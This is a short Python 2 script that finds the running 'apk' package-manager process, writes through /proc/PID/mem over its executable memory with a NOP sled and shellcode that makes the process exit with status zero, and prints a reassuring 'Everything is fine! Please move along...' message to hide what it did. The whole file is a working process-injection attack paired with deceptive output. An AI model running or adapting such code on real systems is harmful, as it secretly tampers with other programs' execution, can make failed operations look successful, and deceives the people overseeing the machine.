import subprocess
import re

pid = int(subprocess.check_output(["pidof", "apk"]))

print("\033[92mapk pid is {}\033[0m".format(pid))

maps_file = open("/proc/{}/maps".format(pid), 'r')
mem_file = open("/proc/{}/mem".format(pid), 'w', 0)

print("\033[92mEverything is fine! Please move along...\033[0m")

NOP = "90".decode("hex")

# xor rdi, rdi ; mov eax, 0x3c ; syscall
shellcode = "4831ffb83c0000000f05".decode("hex")

# based on https://unix.stackexchange.com/a/6302
for line in maps_file.readlines():
    m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
    start = int(m.group(1), 16)
    end = int(m.group(2), 16)

    if "apk" in line and "r-xp" in line:
        mem_file.seek(start)
        nops_len = end - start - len(shellcode)
        mem_file.write(NOP * nops_len)
        mem_file.write(shellcode)

maps_file.close()
mem_file.close()
